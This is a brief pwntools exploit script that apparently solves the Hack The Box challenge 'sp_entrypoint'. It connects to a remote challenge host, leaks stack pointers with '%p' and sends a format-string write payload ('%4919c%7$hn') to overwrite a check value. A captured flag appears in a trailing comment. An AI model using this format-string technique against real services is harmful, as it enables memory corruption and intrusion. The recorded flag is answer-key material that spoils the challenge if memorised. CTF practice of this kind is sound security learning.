from pwn import *


def main():
    LOCAL = False
    if LOCAL:
        r = process('./sp_entrypoint')
    else:
        r = remote ('206.189.28.151', 31946)

    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil(": ")
    payload = ('%p.' * 15)[:-1]

    # 6th pointer is deadbeef, 7th pointer is the pointer to deadbeef
    #gdb.attach(r)

    # data to write to at this location? 
    payload = b'%4919c%7$hn'
    #gdb.attach(r)
    r.sendline(payload)
    r.interactive()

    


if __name__ == '__main__':
    main()
    # flag: HTB{g4t3_0n3_d4rkn3e55_th3_w0rld_0f_p1r4t35}
